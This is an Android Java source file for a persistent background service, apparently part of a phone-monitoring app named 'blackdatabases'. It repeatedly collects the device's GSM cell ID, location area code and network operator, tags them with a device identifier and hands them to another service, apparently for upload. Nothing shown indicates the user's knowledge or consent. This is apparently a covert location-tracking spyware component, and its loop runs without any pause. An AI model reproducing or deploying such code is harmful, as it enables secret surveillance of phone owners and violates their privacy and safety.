package com.record.phone.blackdatabases;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;

/**
 * Created by XSS on 14/08/2017.
 */

public class info_sender extends Service {

    TelephonyManager telephony = null;
    int prevCid, prevLac;
    Handler mhandler = new Handler();
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        prevLac = prevCid = 0;
        super.onDestroy();
    }

    @Override
    public void onCreate() {
        super.onCreate();
        telephony = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        run();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void run()
    {
        new Thread(new Runnable() {
            @Override
            public void run() {
                long tm = System.currentTimeMillis();

            while(true) {
                if (System.currentTimeMillis() - tm > 180000) {
                    String packet = getLoc(true);
                    if (packet.length() > 0) {
                        sendPacket(packet);
                    }

                    tm = System.currentTimeMillis();
                } else {
                    String packet = getLoc(false);
                    if (packet.length() > 0 && packet.compareTo("loc,unknown,unknown,unknown," + MainActivity.uid) != 0)
                        sendPacket(packet);
                }
            }
            }
        }).start();
    }

    private String getLoc(boolean force)
    {
        if (telephony.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
            final GsmCellLocation location = (GsmCellLocation) telephony.getCellLocation();
            String op = telephony.getNetworkOperatorName();

            if (location != null) {

                int newCid = location.getCid() & 0xffff;
                int newLac = location.getLac() & 0xffff;

                if((prevCid != newCid || prevLac != newLac) || force) {
                    String locPacket = "loc," + newCid + "," + newLac + "," + op + "," + MainActivity.uid;
                    prevCid = newCid;
                    prevLac = newLac;
                    return locPacket;
                }
            }
        }
        else
        {
            return "loc,unknown,unknown,unknown," + MainActivity.uid;
        }
        return "loc,unknown,unknown,unknown," + MainActivity.uid;
    }

    public void sendPacket(String info)
    {
        Intent i = new Intent(getBaseContext(), connectionService.class);
        i.putExtra("data", info);
        startService(i);
    }

}
